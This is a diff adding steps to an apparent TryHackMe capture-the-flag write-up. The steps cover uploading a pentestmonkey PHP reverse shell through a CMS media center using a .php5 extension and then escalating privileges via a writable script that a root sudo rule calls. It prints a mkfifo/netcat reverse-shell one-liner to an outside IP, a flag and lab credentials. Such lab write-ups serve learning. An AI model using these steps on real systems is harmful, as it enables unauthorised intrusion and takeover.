@@ -63,3 +63,117 @@ Doing a search for the hash on crackstation.net reveals the password matching th
 Using the username and passwrod we uncovers we gain access to the admin portal
 
 ![](screenshots/adminportal.png)
+
+Grabbing a copy of the file upload exploit from exploit db we see we need the following to make this work
+
+- host to attack (ip of website)
+- username
+- password
+- file to upload (our rev shell in php as that is what the cms runs on)
+
+I get a copy of the php rev shell from pentest monkeys github
+
+```
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+```
+
+now to edit the shell php to point to our machine so we can get the revshell
+
+now we can run the exploit python script to upload our shell
+
+![](screenshots/exploitpy.png)
+
+The exploit script did not work for me it just exits and doesn't upload my payload or give me any out put even though by looking at the exploit code it should.
+
+By reading and understanding what the code is attempting do to it is trivial for us to do this on our own. a few points to remember
+
+- by looking at the example the exploit code give we can not use a regular php file (uploading it is rejected) we have to use .php5 extension
+- the exploit script uploads your file to the media center section of the admin portal so we should be able to do that manually
+
+![](screenshots/mediacenter.png)
+
+from the media center we successfully uploaded our revshell now to run it we know from the exploit code that the files are uploaded to the attchemnt dir under the /content dir so if we navigate to 
+```
+IPADDRESS/content/attachment
+```
+we see our shell is there
+
+![](screenshots/attachment_with_shell.png)
+
+if we click on that while our netcat listener is running we get our shell
+alternatively we can just visit the path directly
+
+```
+IPADDRESS/content/attachment/shell.php5
+```
+
+The browsewr will appear to hang but if you look at your netcat listen you see you have gained access
+
+doing an quick whoami reveals we are running as www-data
+
+if we do an ls of the /home directory we see one users directory itguy
+
+![](screenshots/ls_home.png)
+
+doing an ls of the itguy directory we get a list of files 
+
+![](screenshots/ls_itguy.png)
+
+if we cat the user.txt file we get our first flag
+
+```
+THM{63e5bce9271952aad1113b6f1ac28a07}
+```
+lets take a look at a few of the other files he has in his directory incase there is anything useful
+
+the mysql_login.txt reveals the following 
+
+```
+rice:randompass
+```
+
+the backup.pl script gives us
+
+```
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+```
+This is interesting.
+
+/etc/copy.sh
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+```
+
+checking the permssions of copy.sh we see 
+![](screenshots/copysh_perm.png)
+
+the user owner can read and write to the file the group cant r and pulic can read write and execute meaning we can change this and run it could be useful
+runing copy.sh directly does us no good since it runs as www-data 
+we need to see if we can run anything as sudo with this account
+
+```
+sudo -l
+```
+![](screenshots/sudol.png)
+
+we can run the itguys backup.pl script as root with no password perfect 
+it calls the copy.sh script so lets change it to give us root when ran.
+
+Trying to run
+```
+sudo /home/itguy/backup.pl
+```
+
+we get an error 
+
+![](screenshots/notty.png)
+
+this is for 2 reasons one our shell is not fully interactive. and if it was we would be prompted to enter the password for www-data
+
+in order for this to work we have to use perl to call the backup.pl script
+just doing sudo perl or sudo /home/itguy/backup.pl will not work 
+it will just give us the same error as above since the www-data user can only run
+those two commands together with out a password.
+
